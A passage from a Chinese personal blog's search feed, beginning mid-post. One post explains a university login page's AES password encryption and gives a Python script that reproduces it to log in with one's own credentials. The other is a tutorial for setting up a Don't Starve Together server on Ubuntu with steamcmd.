class="keyword">if</span> (!_p1) &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> encrypted = _gas(_rds(<span class="number">64</span>) + data, _p1, _rds(<span class="number">16</span>));</span><br><span class="line">    <span class="keyword">return</span> encrypted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> $_chars = <span class="string">&#x27;ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> _chars_len = $_chars.length;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_rds</span>(<span class="params">len</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> retStr = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        retStr += $_chars.charAt(<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * _chars_len));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见，加密算法为AES，待加密字符为64位的随机数拼接上<code>password</code>，密钥为<code>key</code>，初始向量IV为16位随机字符串，CBC模式，填充方式为PKCS7。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_gas</span>(<span class="params">data, key0, iv0</span>) </span>&#123;</span><br><span class="line">    key0 = key0.replace(<span class="regexp">/(^\s+)|(\s+$)/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> key = CryptoJS.enc.Utf8.parse(key0);</span><br><span class="line">    <span class="keyword">var</span> iv = CryptoJS.enc.Utf8.parse(iv0);</span><br><span class="line">    <span class="keyword">var</span> encrypted = CryptoJS.AES.encrypt(data, key, &#123;</span><br><span class="line">        iv: iv,</span><br><span class="line">        mode: CryptoJS.mode.CBC,</span><br><span class="line">        padding: CryptoJS.pad.Pkcs7</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> encrypted.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> u = CryptoJS</span><br><span class="line">      , p = u.lib.WordArray;</span><br><span class="line">    u.enc.Base64 = &#123;</span><br><span class="line">        stringify: <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> l = d.words</span><br><span class="line">              , p = d.sigBytes</span><br><span class="line">              , t = <span class="built_in">this</span>._map;</span><br><span class="line">            d.clamp();</span><br><span class="line">            d = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="number">0</span>; r &lt; p; r += <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> w = (l[r &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * (r % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span> | (l[r + <span class="number">1</span> &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * ((r + <span class="number">1</span>) % <span class="number">4</span>) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">8</span> | l[r + <span class="number">2</span> &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; <span class="number">24</span> - <span class="number">8</span> * ((r + <span class="number">2</span>) % <span class="number">4</span>) &amp; <span class="number">255</span>, v = <span class="number">0</span>; <span class="number">4</span> &gt; v &amp;&amp; r + <span class="number">0.75</span> * v &lt; p; v++)</span><br><span class="line">                    d.push(t.charAt(w &gt;&gt;&gt; <span class="number">6</span> * (<span class="number">3</span> - v) &amp; <span class="number">63</span>));</span><br><span class="line">            <span class="keyword">if</span> (l = t.charAt(<span class="number">64</span>))</span><br><span class="line">                <span class="keyword">for</span> (; d.length % <span class="number">4</span>; )</span><br><span class="line">                    d.push(l);</span><br><span class="line">            <span class="keyword">return</span> d.join(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        parse: <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> l = d.length</span><br><span class="line">              , s = <span class="built_in">this</span>._map</span><br><span class="line">              , t = s.charAt(<span class="number">64</span>);</span><br><span class="line">            t &amp;&amp; (t = d.indexOf(t),</span><br><span class="line">            -<span class="number">1</span> != t &amp;&amp; (l = t));</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = [], r = <span class="number">0</span>, w = <span class="number">0</span>; w &lt; l; w++)</span><br><span class="line">                <span class="keyword">if</span> (w % <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> v = s.indexOf(d.charAt(w - <span class="number">1</span>)) &lt;&lt; <span class="number">2</span> * (w % <span class="number">4</span>)</span><br><span class="line">                      , b = s.indexOf(d.charAt(w)) &gt;&gt;&gt; <span class="number">6</span> - <span class="number">2</span> * (w % <span class="number">4</span>);</span><br><span class="line">                    t[r &gt;&gt;&gt; <span class="number">2</span>] |= (v | b) &lt;&lt; <span class="number">24</span> - <span class="number">8</span> * (r % <span class="number">4</span>);</span><br><span class="line">                    r++</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">return</span> p.create(t, r)</span><br><span class="line">        &#125;,</span><br><span class="line">        _map: <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="登陆复现"><a href="#登陆复现" class="headerlink" title="登陆复现"></a>登陆复现</h3><p>解密验证，发现末尾为<code>password</code>。（推荐工具：cyberchef）<br><img src="/2021/03/05/auth/3.jpg" alt="img"></p><h4 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h4><p><img src="/2021/03/05/auth/cbc_decryption.png" alt="img"><br>可见，初始向量的不同只影响第一块的明文，所以初始向量可自定义。</p><h4 id="复现代码"><a href="#复现代码" class="headerlink" title="复现代码"></a>复现代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#随机字符串产生</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getRandomN</span>(<span class="params">N</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        s += <span class="built_in">str</span>(random.randint(<span class="number">0</span>,<span class="number">9</span>))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="comment">#PKCS7填充</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">    bs = AES.block_size</span><br><span class="line">    data += (bs - <span class="built_in">len</span>(data)%bs) * <span class="built_in">chr</span>(bs - <span class="built_in">len</span>(data)%bs)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data,key,iv</span>):</span></span><br><span class="line">    iv = iv.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>),AES.MODE_CBC,iv)</span><br><span class="line">    data = cipher.encrypt(pad(data).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data,key</span>):</span></span><br><span class="line">    iv = <span class="string">&#x27;0000000000000000&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    data = cipher.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> (data[<span class="number">64</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">#base64编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPwd</span>(<span class="params">data,key</span>):</span></span><br><span class="line">    iv = getRandomN(<span class="number">16</span>)</span><br><span class="line">    data  = getRandomN(<span class="number">64</span>) + data</span><br><span class="line">    <span class="keyword">return</span> (base64.b64encode(encrypt(data,key,iv)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#登陆函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">username,password</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;https://xxx.edu.cn&#x27;</span></span><br><span class="line">    r = ses.get(url,headers=header)</span><br><span class="line">    text = r.text</span><br><span class="line">    l = re.findall(<span class="string">r&#x27;&lt;input type=\&quot;hidden\&quot; .*?=\&quot;.*?\&quot; value=\&quot;(.*?)\&quot;&#x27;</span>,text)</span><br><span class="line">    password = getPwd(password,l[<span class="number">5</span>])</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>:username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:password,</span><br><span class="line">        <span class="string">&#x27;lt&#x27;</span>:l[<span class="number">0</span>],</span><br><span class="line">        <span class="string">&#x27;dllt&#x27;</span>:l[<span class="number">1</span>],</span><br><span class="line">        <span class="string">&#x27;execution&#x27;</span>:l[<span class="number">2</span>],</span><br><span class="line">        <span class="string">&#x27;_eventId&#x27;</span>:l[<span class="number">3</span>],</span><br><span class="line">        <span class="string">&#x27;rmShown&#x27;</span>:l[<span class="number">4</span>],</span><br><span class="line">    &#125;</span><br><span class="line">    r = ses.post(url,data=data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu搭建饥荒服务器</title>
      <link href="2020/06/24/dst/"/>
      <url>2020/06/24/dst/</url>
      
        <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h4 id="本地创建世界"><a href="#本地创建世界" class="headerlink" title="本地创建世界"></a>本地创建世界</h4><p>配置好房间名、密码、游戏模式等，这之后将会运行在你的服务器上。</p><h4 id="获取token和用户ID"><a href="#获取token和用户ID" class="headerlink" title="获取token和用户ID"></a>获取token和用户ID</h4><p>打开游戏左下角的 “账号” 可以获取用户ID，将ID保存在adminlist.txt中。<br><img src="/2020/06/24/dst/id.png" alt="img"></p><p>依次点击上方的游戏、饥荒联机服务器。<br><img src="/2020/06/24/dst/game.png" alt="img"><br><img src="/2020/06/24/dst/token.png" alt="img"><br>将token保存在cluster_token.txt中。</p><p>把cluster_token.txt和adminlist.txt都放在xxx\Documents\Klei\DoNotStarveTogether\xxx\Cluster_1中。<br>其中Cluster_1就是创建的第一个世界，Cluster_2同理。</p><h2 id="动手！"><a href="#动手！" class="headerlink" title="动手！"></a>动手！</h2><h3 id="安装环境依赖"><a href="#安装环境依赖" class="headerlink" title="安装环境依赖"></a>安装环境依赖</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install libstdc++6:i386 libgcc1:i386 libcurl4-gnutls-dev:i386 lib32gcc1</span><br></pre></td></tr></table></figure><h3 id="64位机器先运行"><a href="#64位机器先运行" class="headerlink" title="64位机器先运行"></a>64位机器先运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo dpkg --add-architecture i386 &amp;&amp; sudo apt-get update</span><br></pre></td></tr></table></figure><h3 id="安装steamCMD"><a href="#安装steamCMD" class="headerlink" title="安装steamCMD"></a>安装steamCMD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir ~&#x2F;steamcmd</span><br><span class="line">$ cd ~&#x2F;steamcmd</span><br><span class="line">$ wget https:&#x2F;&#x2F;steamcdn-a.akamaihd.net&#x2F;client&#x2F;installer&#x2F;steamcmd_linux.tar.gz</span><br><span class="line">$ tar -xvzf steamcmd_linux.tar.gz</span><br></pre></td></tr></table></figure><h3 id="运行steamCMD"><a href="#运行steamCMD" class="headerlink" title="运行steamCMD"></a>运行steamCMD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;steamcmd.sh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ login anonymous</span><br><span class="line">$ force_install_dir ~&#x2F;dstserver</span><br><span class="line">$ app_update 343050 validate</span><br><span class="line">$ quit</span><br></pre></td></tr></table></figure><p>匿名登陆、指定安装文件夹、安装饥荒服务器软件、退出。</p><h3 id="启动饥荒服务器"><a href="#启动饥荒服务器" class="headerlink" title="启动饥荒服务器"></a>启动饥荒服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;dstserver&#x2F;bin</span><br><span class="line">.&#x2F;dontstarve_dedicated_server_nullrenderer</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目的是使其在 <strong>~/.klei/</strong> 生成基本配置文件，方便覆盖。<br>出现有关token错误时，ctrl+c结束。</p><h3 id="配置存档"><a href="#配置存档" class="headerlink" title="配置存档"></a>配置存档</h3><p>服务器的目录结构和本地的有些许差异。</p><p>本地<br><img src="/2020/06/24/dst/pc.png" alt="img"></p><p>服务器<br><img src="/2020/06/24/dst/server.png" alt="img"></p><p>只需将 <strong>数字/Cluster_1</strong> 覆盖 <strong>Cluster_1</strong> ，并将<strong>数字/client_save</strong>里面内容拖进 <strong>\Cluster_1\Master\save</strong></p><h3 id="运行服务器"><a href="#运行服务器" class="headerlink" title="运行服务器"></a>运行服务器</h3><p>创建 start.sh 如下内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/dstserver/bin</span><br><span class="line">screen -S <span class="string">&quot;Don&#x27;t Starve Together Server&quot;</span> ./dontstarve_dedicated_server_nullrenderer</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x start.sh</span><br><span class="line">$ .&#x2F;start.sh</span><br></pre></td></tr></table></figure><p>ctrl+a+d可以后台运行</p><h2 id="关于mod"><a href="#关于mod" class="headerlink" title="关于mod"></a>关于mod</h2><p>推荐在本地添加好mod，之后将本地的<strong>数字/Cluster_1/Master/modoverrides.lua</strong>拖进服务器。并在 <strong>~/dstserver/mods/dedicated_server_mods_setup.lua</strong>中如下添加。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">--There are two functions that will install mods, ServerModSetup and ServerModCollectionSetup. Put the calls to the functions in this file and they will be executed on boot.</span><br><span class="line"></span><br><span class="line">--ServerModSetup takes a string of a specific mod&#39;s Workshop id. It will download and install the mod to your mod directory on boot.</span><br><span class="line">--The Workshop id can be found at the end of the url to the mod&#39;s Workshop page.</span><br><span class="line">--Example: http:&#x2F;&#x2F;steamcommunity.com&#x2F;sharedfiles&#x2F;filedetails&#x2F;?id&#x3D;350811795</span><br><span class="line">--ServerModSetup(&quot;350811795&quot;)</span><br><span class="line"></span><br><span class="line">--ServerModCollectionSetup takes a string of a specific mod&#39;s Workshop id. It will download all the mods in the collection and install them to the mod directory on boot.</span><br><span class="line">--The Workshop id can be found at the end of the url to the collection&#39;s Workshop page.</span><br><span class="line">--Example: http:&#x2F;&#x2F;steamcommunity.com&#x2F;sharedfiles&#x2F;filedetails&#x2F;?id&#x3D;379114180</span><br><span class="line">--ServerModCollectionSetup(&quot;379114180&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ServerModSetup(&quot;378160973&quot;)--Global Positions</span><br><span class="line">ServerModSetup(&quot;362175979&quot;)--Wormhole Marks</span><br><span class="line">ServerModSetup(&quot;444235588&quot;)--Deluxe Campfires 2.11</span><br><span class="line">ServerModSetup(&quot;786556008&quot;)--45 Inventory Slots</span><br><span class="line">ServerModSetup(&quot;375859599&quot;)--Health Info</span><br><span class="line">ServerModSetup(&quot;458587300&quot;)--fast travel</span><br><span class="line">ServerModSetup(&quot;666155465&quot;)--Show Me</span><br><span class="line">ServerModSetup(&quot;50138507&quot;)--pick fastly </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="遇见的问题"><a href="#遇见的问题" class="headerlink" title="遇见的问题"></a>遇见的问题</h2><h3 id="饥荒更新后搜索不到房间"><a href="#饥荒更新后搜索不到房间" class="headerlink" title="饥荒更新后搜索不到房间"></a>饥荒更新后搜索不到房间</h3><p>在 <strong>~/steamcmd/<strong>下创建</strong>update.sh</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;steamcmd.sh +login anonymous +force_install_dir &#x2F;home&#x2F;xxx&#x2F;dstserver +app_update 343050  +quit</span><br></pre></td></tr></table></figure><p><strong>注意xx要替换</strong></p><h3 id="报错-Directory-‘-var-run-screen’-must-have-mode-755"><a href="#报错-Directory-‘-var-run-screen’-must-have-mode-755" class="headerlink" title="报错 Directory ‘/var/run/screen’ must have mode 755"></a>报错 Directory ‘/var/run/screen’ must have mode 755</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chmod 755 &#x2F;var&#x2F;run&#x2F;screen </span><br></pre></td></tr></table></figure><h3 id="Screen出现Cannot-open-your-terminal-‘-dev-pts-0’"><a href="#Screen出现Cannot-open-your-terminal-‘-dev-pts-0’" class="headerlink" title="Screen出现Cannot open your terminal ‘/dev/pts/0’"></a>Screen出现Cannot open your terminal ‘/dev/pts/0’</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ script &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><h3 id="Loading-Steam-API…Failed-to-init-SDL-priority-manager-SDL-not-found"><a href="#Loading-Steam-API…Failed-to-init-SDL-priority-manager-SDL-not-found" class="headerlink" title="Loading Steam API…Failed to init SDL priority manager: SDL not found"></a>Loading Steam API…Failed to init SDL priority manager: SDL not found</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install libsdl2-2.0-0:i386</span><br></pre></td></tr></table></figure><h3 id="客户端创建了世界想在服务器运行"><a href="#客户端创建了世界想在服务器运行" class="headerlink" title="客户端创建了世界想在服务器运行"></a>客户端创建了世界想在服务器运行</h3><p>只需将<strong>数字/client_save</strong>里面内容拖进 <strong>\Cluster_1\Master\save</strong>，并将 <strong>数字\Cluster_1\Master\save</strong> 里的<strong>session</strong>文件夹合并 <strong>\Cluster_1\Master\save</strong>里的<strong>session</strong></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
